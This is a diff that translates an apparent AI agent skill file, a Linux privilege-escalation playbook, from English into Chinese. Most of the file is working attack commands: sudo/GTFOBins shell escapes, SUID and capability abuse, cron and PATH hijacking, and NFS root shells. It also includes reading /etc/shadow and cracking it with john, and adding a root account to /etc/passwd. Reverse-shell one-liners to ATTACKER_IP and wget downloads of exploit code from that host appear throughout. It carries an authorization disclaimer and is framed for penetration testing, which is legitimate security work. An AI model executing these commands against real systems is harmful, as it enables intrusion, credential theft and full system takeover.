@@ -7,143 +7,143 @@ author: zebbern
 date_added: "2026-02-27"
 ---
 
-> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
+> 仅限授权使用：此技能仅用于授权的安全评估、防御性验证或受控教育环境。
 
-# Linux Privilege Escalation
+# Linux 权限提升
 
-## Purpose
+## 目的
 
-Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.
+在 Linux 系统上执行系统化权限提升评估，以识别和利用允许从低权限用户访问提升到 root 级控制的错误配置、脆弱服务和安全弱点。此技能支持对内核漏洞、sudo 错误配置、SUID 二进制文件、cron 作业、能力、PATH 劫持和 NFS 弱点进行全面枚举和利用。
 
-## Inputs / Prerequisites
+## 输入/前提条件
 
-### Required Access
-- Low-privilege shell access to target Linux system
-- Ability to execute commands (interactive or semi-interactive shell)
-- Network access for reverse shell connections (if needed)
-- Attacker machine for payload hosting and receiving shells
+### 所需访问
+- 目标 Linux 系统的低权限 shell 访问
+- 执行命令的能力（交互式或半交互式 shell）
+- 用于反向 shell 连接的网络访问（如果需要）
+- 用于托管 payload 和接收 shell 的攻击机
 
-### Technical Requirements
-- Understanding of Linux filesystem permissions and ownership
-- Familiarity with common Linux utilities and scripting
-- Knowledge of kernel versions and associated vulnerabilities
-- Basic understanding of compilation (gcc) for custom exploits
+### 技术要求
+- 了解 Linux 文件系统权限和所有权
+- 熟悉常用 Linux 工具和脚本编写
+- 了解内核版本和相关漏洞
+- 对编译（gcc）用于自定义漏洞利用的基本理解
 
-### Recommended Tools
-- LinPEAS, LinEnum, or Linux Smart Enumeration scripts
+### 推荐工具
+- LinPEAS、LinEnum 或 Linux Smart Enumeration 脚本
 - Linux Exploit Suggester (LES)
-- GTFOBins reference for binary exploitation
-- John the Ripper or Hashcat for password cracking
-- Netcat or similar for reverse shells
+- 用于二进制利用的 GTFOBins 参考
+- John the Ripper 或 Hashcat 用于密码破解
+- Netcat 或类似的用于反向 shell
 
-## Outputs / Deliverables
+## 输出/可交付成果
 
-### Primary Outputs
-- Root shell access on target system
-- Privilege escalation path documentation
-- System enumeration findings report
-- Recommendations for remediation
+### 主要输出
+- 目标系统上的 root shell 访问
+- 权限提升路径文档
+- 系统枚举发现报告
+- 修复建议
 
-### Evidence Artifacts
-- Screenshots of successful privilege escalation
-- Command output logs demonstrating root access
-- Identified vulnerability details
-- Exploited configuration files
+### 证据工件
+- 成功权限提升的截图
+- 证明 root 访问的命令输出日志
+- 已识别的漏洞详情
+- 被利用的配置文件
 
-## Core Workflow
+## 核心工作流
 
-### Phase 1: System Enumeration
+### 阶段 1：系统枚举
 
-#### Basic System Information
-Gather fundamental system details for vulnerability research:
+#### 基本系统信息
+收集用于漏洞研究的基本系统详情：
 
 ```bash
-# Hostname and system role
+# 主机名和系统角色
 hostname
 
-# Kernel version and architecture
+# 内核版本和架构
 uname -a
 
-# Detailed kernel information
+# 详细内核信息
 cat /proc/version
 
-# Operating system details
+# 操作系统详情
 cat /etc/issue
 cat /etc/*-release
 
-# Architecture
+# 架构
 arch
 ```
 
-#### User and Permission Enumeration
+#### 用户和权限枚举
 
 ```bash
-# Current user context
+# 当前用户上下文
 whoami
 id
 
-# Users with login shells
+# 具有登录 shell 的用户
 cat /etc/passwd | grep -v nologin | grep -v false
 
-# Users with home directories
+# 具有家目录的用户
 cat /etc/passwd | grep home
 
-# Group memberships
+# 组成员身份
 groups
 
-# Other logged-in users
+# 其他登录用户
 w
 who
 ```
 
-#### Network Information
+#### 网络信息
 
 ```bash
-# Network interfaces
+# 网络接口
 ifconfig
 ip addr
 
-# Routing table
+# 路由表
 ip route
 
-# Active connections
+# 活跃连接
 netstat -antup
 ss -tulpn
 
-# Listening services
+# 监听服务
 netstat -l
 ```
 
-#### Process and Service Enumeration
+#### 进程和服务枚举
 
 ```bash
-# All running processes
+# 所有运行中的进程
 ps aux
 ps -ef
 
-# Process tree view
+# 进程树视图
 ps axjf
 
-# Services running as root
+# 以 root 身份运行的服务
 ps aux | grep root
 ```
 
-#### Environment Variables
+#### 环境变量
 
 ```bash
-# Full environment
+# 完整环境
 env
 
-# PATH variable (for hijacking)
+# PATH 变量（用于劫持）
 echo $PATH
 ```
 
-### Phase 2: Automated Enumeration
+### 阶段 2：自动枚举
 
-Deploy automated scripts for comprehensive enumeration:
+部署自动化脚本进行全面枚举：
 
 ```bash
-# LinPEAS: download first, inspect the script, then execute only in an authorized lab
+# LinPEAS：先下载，检查脚本，仅在授权实验室中执行
 curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 less linpeas.sh
 chmod +x linpeas.sh
@@ -159,89 +159,89 @@ chmod +x linpeas.sh
 ./les.sh
 ```
 
-Transfer scripts to target system:
+传输脚本到目标系统：
 
 ```bash
-# On attacker machine
+# 在攻击机上
 python3 -m http.server 8000
 
-# On target machine
+# 在目标机上
 wget http://ATTACKER_IP:8000/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-### Phase 3: Kernel Exploits
+### 阶段 3：内核漏洞利用
 
-#### Identify Kernel Version
+#### 识别内核版本
 
 ```bash
 uname -r
 cat /proc/version
 ```
 
-#### Search for Exploits
+#### 搜索漏洞利用
 
 ```bash
-# Use Linux Exploit Suggester
+# 使用 Linux Exploit Suggester
 ./linux-exploit-suggester.sh
 
-# Manual search on exploit-db
-searchsploit linux kernel [version]
+# 在 exploit-db 上手动搜索
+searchsploit linux kernel [版本]
 ```
 
-#### Common Kernel Exploits
+#### 常见内核漏洞利用
 
-| Kernel Version | Exploit | CVE |
+| 内核版本 | 漏洞利用 | CVE |
 |---------------|---------|-----|
 | 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
 | 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
 | 5.8+ | Dirty Pipe | CVE-2022-0847 |
 
-#### Compile and Execute
+#### 编译和执行
 
 ```bash
-# Transfer exploit source
+# 传输漏洞源代码
 wget http://ATTACKER_IP/exploit.c
 
-# Compile on target
+# 在目标上编译
 gcc exploit.c -o exploit
 
-# Execute
+# 执行
 ./exploit
 ```
 
-### Phase 4: Sudo Exploitation
+### 阶段 4：Sudo 利用
 
-#### Enumerate Sudo Privileges
+#### 枚举 Sudo 权限
 
 ```bash
 sudo -l
 ```
 
-#### GTFOBins Sudo Exploitation
-Reference https://gtfobins.github.io for exploitation commands:
+#### GTFOBins Sudo 利用
+参考 https://gtfobins.github.io 获取利用命令：
 
 ```bash
-# Example: vim with sudo
+# 示例：vim 配合 sudo
 sudo vim -c ':!/bin/bash'
 
-# Example: find with sudo
+# 示例：find 配合 sudo
 sudo find . -exec /bin/sh \; -quit
 
-# Example: awk with sudo
+# 示例：awk 配合 sudo
 sudo awk 'BEGIN {system("/bin/bash")}'
 
-# Example: python with sudo
+# 示例：python 配合 sudo
 sudo python -c 'import os; os.system("/bin/bash")'
 
-# Example: less with sudo
+# 示例：less 配合 sudo
 sudo less /etc/passwd
 !/bin/bash
 ```
 
-#### LD_PRELOAD Exploitation
-When env_keep includes LD_PRELOAD:
+#### LD_PRELOAD 利用
+当 env_keep 包含 LD_PRELOAD 时：
 
 ```c
 // shell.c
@@ -258,159 +258,159 @@ void _init() {
 ```
 
 ```bash
-# Compile shared library
+# 编译共享库
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
-# Execute with sudo
+# 使用 sudo 执行
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
-### Phase 5: SUID Binary Exploitation
+### 阶段 5：SUID 二进制利用
 
-#### Find SUID Binaries
+#### 查找 SUID 二进制
 
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-#### Exploit SUID Binaries
-Reference GTFOBins for SUID exploitation:
+#### 利用 SUID 二进制
+参考 GTFOBins 获取 SUID 利用：
 
 ```bash
-# Example: base64 for file reading
+# 示例：base64 用于文件读取
 LFILE=/etc/shadow
 base64 "$LFILE" | base64 -d
 
-# Example: cp for file writing
+# 示例：cp 用于文件写入
 cp /bin/bash /tmp/bash
 chmod +s /tmp/bash
 /tmp/bash -p
 
-# Example: find with SUID
+# 示例：find 配合 SUID
 find . -exec /bin/sh -p \; -quit
 ```
 
-#### Password Cracking via SUID
+#### 通过 SUID 破解密码
 
 ```bash
-# Read shadow file (if base64 has SUID)
+# 读取 shadow 文件（如果 base64 有 SUID）
 base64 /etc/shadow | base64 -d > shadow.txt
 base64 /etc/passwd | base64 -d > passwd.txt
 
-# On attacker machine
+# 在攻击机上
 unshadow passwd.txt shadow.txt > hashes.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
-#### Add User to passwd (if nano/vim has SUID)
+#### 向 passwd 添加用户（如果 nano/vim 有 SUID）
 
 ```bash
-# Generate password hash
+# 生成密码哈希
 openssl passwd -1 -salt new newpassword
 
-# Add to /etc/passwd (using SUID editor)
+# 添加到 /etc/passwd（使用 SUID 编辑器）
 newuser:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 ```
 
-### Phase 6: Capabilities Exploitation
+### 阶段 6：能力（Capabilities）利用
 
-#### Enumerate Capabilities
+#### 枚举能力
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-#### Exploit Capabilities
+#### 利用能力
 
 ```bash
-# Example: python with cap_setuid
+# 示例：python 配合 cap_setuid
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-# Example: vim with cap_setuid
+# 示例：vim 配合 cap_setuid
 ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
 
-# Example: perl with cap_setuid
+# 示例：perl 配合 cap_setuid
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
-### Phase 7: Cron Job Exploitation
+### 阶段 7：Cron 作业利用
 
-#### Enumerate Cron Jobs
+#### 枚举 Cron 作业
 
 ```bash
-# System crontab
+# 系统 crontab
 cat /etc/crontab
 
-# User crontabs
+# 用户 crontabs
 ls -la /var/spool/cron/crontabs/
 
-# Cron directories
+# Cron 目录
 ls -la /etc/cron.*
 
-# Systemd timers
+# Systemd 定时器
 systemctl list-timers
 ```
 
-#### Exploit Writable Cron Scripts
+#### 利用可写 Cron 脚本
 
 ```bash
-# Identify writable cron script from /etc/crontab
-ls -la /opt/backup.sh        # Check permissions
+# 从 /etc/crontab 识别可写 cron 脚本
+ls -la /opt/backup.sh        # 检查权限
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
 
-# If cron references non-existent script in writable PATH
+# 如果 cron 引用可写 PATH 中不存在的脚本
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
 chmod +x /home/user/antivirus.sh
 ```
 
-### Phase 8: PATH Hijacking
+### 阶段 8：PATH 劫持
 
 ```bash
-# Find SUID binary calling external command
+# 查找调用外部命令的 SUID 二进制
 strings /usr/local/bin/suid-binary
-# Shows: system("service apache2 start")
+# 显示：system("service apache2 start")
 
-# Hijack by creating malicious binary in writable PATH
+# 通过创建可写 PATH 中的恶意二进制进行劫持
 export PATH=/tmp:$PATH
 echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
 chmod +x /tmp/service
-/usr/local/bin/suid-binary      # Execute SUID binary
+/usr/local/bin/suid-binary      # 执行 SUID 二进制
 ```
 
-### Phase 9: NFS Exploitation
+### 阶段 9：NFS 利用
 
 ```bash
-# On target - look for no_root_squash option
+# 在目标上—查找 no_root_squash 选项
 cat /etc/exports
 
-# On attacker - mount share and create SUID binary
+# 在攻击机上—挂载共享并创建 SUID 二进制
 showmount -e TARGET_IP
 mount -o rw TARGET_IP:/share /tmp/nfs
 
-# Create and compile SUID shell
+# 创建并编译 SUID shell
 echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
 gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
 
-# On target - execute
+# 在目标上—执行
 /share/shell
 ```
 
-## Quick Reference
+## 快速参考
 
-### Enumeration Commands Summary
-| Purpose | Command |
+### 枚举命令汇总
+| 目的 | 命令 |
 |---------|---------|
-| Kernel version | `uname -a` |
-| Current user | `id` |
-| Sudo rights | `sudo -l` |
-| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
-| Capabilities | `getcap -r / 2>/dev/null` |
-| Cron jobs | `cat /etc/crontab` |
-| Writable dirs | `find / -writable -type d 2>/dev/null` |
-| NFS exports | `cat /etc/exports` |
+| 内核版本 | `uname -a` |
+| 当前用户 | `id` |
+| Sudo 权限 | `sudo -l` |
+| SUID 文件 | `find / -perm -u=s -type f 2>/dev/null` |
+| 能力 | `getcap -r / 2>/dev/null` |
+| Cron 作业 | `cat /etc/crontab` |
+| 可写目录 | `find / -writable -type d 2>/dev/null` |
+| NFS 导出 | `cat /etc/exports` |
 
-### Reverse Shell One-Liners
+### 反向 Shell 一行命令
 ```bash
 # Bash
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
@@ -425,36 +425,36 @@ nc -e /bin/bash ATTACKER_IP 4444
 perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
 ```
 
-### Key Resources
-- GTFOBins: https://gtfobins.github.io
-- LinPEAS: https://github.com/carlospolop/PEASS-ng
-- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
+### 关键资源
+- GTFOBins：https://gtfobins.github.io
+- LinPEAS：https://github.com/carlospolop/PEASS-ng
+- Linux Exploit Suggester：https://github.com/mzet-/linux-exploit-suggester
 
-## Constraints and Guardrails
+## 约束与护栏
 
-### Operational Boundaries
-- Verify kernel exploits in test environment before production use
-- Failed kernel exploits may crash the system
-- Document all changes made during privilege escalation
-- Maintain access persistence only as authorized
+### 操作边界
+- 在生产环境中使用前，先在测试环境中验证内核漏洞利用
+- 失败的内核利用可能导致系统崩溃
+- 记录权限提升期间所做的所有更改
+- 仅在授权范围内维持访问持久性
 
-### Technical Limitations
-- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
-- AppArmor/SELinux may restrict exploitation techniques
-- Container environments limit kernel-level exploits
-- Hardened systems may have restricted sudo configurations
+### 技术限制
+- 现代内核可能具有利用缓解措施（ASLR、SMEP、SMAP）
+- AppArmor/SELinux 可能限制利用技术
+- 容器环境限制内核级利用
+- 加固系统可能具有受限的 sudo 配置
 
-### Legal and Ethical Requirements
-- Written authorization required before testing
-- Stay within defined scope boundaries
-- Report critical findings immediately
-- Do not access data beyond scope requirements
+### 法律和道德要求
+- 测试前需要书面授权
+- 保持在定义的范围内
+- 立即报告关键发现
+- 不要访问超出范围的数据
 
-## Examples
+## 示例
 
-### Example 1: Sudo to Root via find
+### 示例 1：通过 find 从 Sudo 到 Root
 
-**Scenario**: User has sudo rights for find command
+**场景**：用户对 find 命令具有 sudo 权限
 
 ```bash
 $ sudo -l
@@ -466,9 +466,9 @@ $ sudo find . -exec /bin/bash \; -quit
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Example 2: SUID base64 for Shadow Access
+### 示例 2：SUID base64 获取 Shadow 访问
 
-**Scenario**: base64 binary has SUID bit set
+**场景**：base64 二进制设置了 SUID 位
 
 ```bash
 $ find / -perm -u=s -type f 2>/dev/null | grep base64
@@ -477,13 +477,13 @@ $ find / -perm -u=s -type f 2>/dev/null | grep base64
 $ base64 /etc/shadow | base64 -d
 root:$6$xyz...:18000:0:99999:7:::
 
-# Crack offline with john
+# 离线破解
 $ john --wordlist=rockyou.txt shadow.txt
 ```
 
-### Example 3: Cron Job Script Hijacking
+### 示例 3：Cron 作业脚本劫持
 
-**Scenario**: Root cron job executes writable script
+**场景**：Root cron 作业执行可写脚本
 
 ```bash
 $ cat /etc/crontab
@@ -494,20 +494,20 @@ $ ls -la /opt/scripts/backup.sh
 
 $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh
 
-# Wait 1 minute
+# 等待 1 分钟
 $ /tmp/bash -p
 # id
 uid=1000(user) gid=1000(user) euid=0(root)
 ```
 
-## Troubleshooting
+## 故障排除
 
-| Issue | Solutions |
+| 问题 | 解决方案 |
 |-------|-----------|
-| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
-| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
-| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
-| Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |
+| 漏洞利用编译失败 | 检查 gcc：`which gcc`；在攻击机上为相同架构编译；使用 `gcc -static` |
+| 反向 shell 无法连接 | 检查防火墙；尝试端口 443/80；使用分段 payload；检查出口过滤 |
+| SUID 二进制不可利用 | 验证版本是否匹配 GTFOBins；检查 AppArmor/SELinux；有些二进制会丢弃权限 |
+| Cron 作业未执行 | 验证 cron 运行：`service cron status`；检查 +x 权限；验证 crontab 中的 PATH |
 
-## When to Use
-This skill is applicable to execute the workflow or actions described in the overview.
+## 何时使用
+此技能适用于执行概述中描述的工作流或操作。
